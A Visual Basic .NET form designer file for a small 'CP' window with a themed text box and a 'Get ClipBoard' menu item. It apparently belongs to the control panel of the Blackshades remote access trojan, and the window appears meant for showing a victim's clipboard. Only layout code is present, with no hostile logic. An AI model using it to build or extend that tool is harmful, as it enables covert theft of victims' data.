<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class CP
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Me.BlackShadesNetForm1 = New Blackshades.BlackShadesNetForm()
        Me.Panel3 = New System.Windows.Forms.Panel()
        Me.Panel2 = New System.Windows.Forms.Panel()
        Me.TextBox1 = New System.Windows.Forms.TextBox()
        Me.Panel1 = New System.Windows.Forms.Panel()
        Me.ContextMenuStrip1 = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.GetClipBoardToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.BlackShadesNetForm1.SuspendLayout()
        Me.Panel2.SuspendLayout()
        Me.ContextMenuStrip1.SuspendLayout()
        Me.SuspendLayout()
        '
        'BlackShadesNetForm1
        '
        Me.BlackShadesNetForm1.CloseButtonExitsApp = False
        Me.BlackShadesNetForm1.Controls.Add(Me.Panel3)
        Me.BlackShadesNetForm1.Controls.Add(Me.Panel2)
        Me.BlackShadesNetForm1.Controls.Add(Me.Panel1)
        Me.BlackShadesNetForm1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.BlackShadesNetForm1.Font = New System.Drawing.Font("Trebuchet MS", 8.25!, System.Drawing.FontStyle.Bold)
        Me.BlackShadesNetForm1.ForeColor = System.Drawing.Color.FromArgb(CType(CType(142, Byte), Integer), CType(CType(152, Byte), Integer), CType(CType(156, Byte), Integer))
        Me.BlackShadesNetForm1.Location = New System.Drawing.Point(0, 0)
        Me.BlackShadesNetForm1.MinimizeButton = True
        Me.BlackShadesNetForm1.Name = "BlackShadesNetForm1"
        Me.BlackShadesNetForm1.Size = New System.Drawing.Size(416, 226)
        Me.BlackShadesNetForm1.TabIndex = 0
        Me.BlackShadesNetForm1.Text = "CP"
        '
        'Panel3
        '
        Me.Panel3.BackColor = System.Drawing.Color.Transparent
        Me.Panel3.Dock = System.Windows.Forms.DockStyle.Left
        Me.Panel3.Location = New System.Drawing.Point(0, 30)
        Me.Panel3.Name = "Panel3"
        Me.Panel3.Size = New System.Drawing.Size(28, 196)
        Me.Panel3.TabIndex = 4
        '
        'Panel2
        '
        Me.Panel2.BackColor = System.Drawing.Color.DimGray
        Me.Panel2.Controls.Add(Me.TextBox1)
        Me.Panel2.Dock = System.Windows.Forms.DockStyle.Right
        Me.Panel2.Location = New System.Drawing.Point(27, 30)
        Me.Panel2.Name = "Panel2"
        Me.Panel2.Size = New System.Drawing.Size(389, 196)
        Me.Panel2.TabIndex = 3
        '
        'TextBox1
        '
        Me.TextBox1.BackColor = System.Drawing.Color.FromArgb(CType(CType(25, Byte), Integer), CType(CType(25, Byte), Integer), CType(CType(25, Byte), Integer))
        Me.TextBox1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.TextBox1.ContextMenuStrip = Me.ContextMenuStrip1
        Me.TextBox1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.TextBox1.ForeColor = System.Drawing.Color.Lime
        Me.TextBox1.Location = New System.Drawing.Point(0, 0)
        Me.TextBox1.Multiline = True
        Me.TextBox1.Name = "TextBox1"
        Me.TextBox1.Size = New System.Drawing.Size(389, 196)
        Me.TextBox1.TabIndex = 3
        '
        'Panel1
        '
        Me.Panel1.BackColor = System.Drawing.Color.Transparent
        Me.Panel1.Dock = System.Windows.Forms.DockStyle.Top
        Me.Panel1.Location = New System.Drawing.Point(0, 0)
        Me.Panel1.Name = "Panel1"
        Me.Panel1.Size = New System.Drawing.Size(416, 30)
        Me.Panel1.TabIndex = 2
        '
        'ContextMenuStrip1
        '
        Me.ContextMenuStrip1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.GetClipBoardToolStripMenuItem})
        Me.ContextMenuStrip1.Name = "ContextMenuStrip1"
        Me.ContextMenuStrip1.Size = New System.Drawing.Size(148, 26)
        '
        'GetClipBoardToolStripMenuItem
        '
        Me.GetClipBoardToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(25, Byte), Integer), CType(CType(25, Byte), Integer), CType(CType(25, Byte), Integer))
        Me.GetClipBoardToolStripMenuItem.ForeColor = System.Drawing.Color.Lime
        Me.GetClipBoardToolStripMenuItem.Name = "GetClipBoardToolStripMenuItem"
        Me.GetClipBoardToolStripMenuItem.Size = New System.Drawing.Size(147, 22)
        Me.GetClipBoardToolStripMenuItem.Text = "Get ClipBoard"
        '
        'CP
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(416, 226)
        Me.Controls.Add(Me.BlackShadesNetForm1)
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None
        Me.Name = "CP"
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = "CP"
        Me.TransparencyKey = System.Drawing.Color.Fuchsia
        Me.BlackShadesNetForm1.ResumeLayout(False)
        Me.Panel2.ResumeLayout(False)
        Me.Panel2.PerformLayout()
        Me.ContextMenuStrip1.ResumeLayout(False)
        Me.ResumeLayout(False)

    End Sub
    Friend WithEvents BlackShadesNetForm1 As Blackshades.BlackShadesNetForm
    Friend WithEvents Panel3 As System.Windows.Forms.Panel
    Friend WithEvents Panel2 As System.Windows.Forms.Panel
    Friend WithEvents TextBox1 As System.Windows.Forms.TextBox
    Friend WithEvents Panel1 As System.Windows.Forms.Panel
    Friend WithEvents ContextMenuStrip1 As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents GetClipBoardToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
End Class
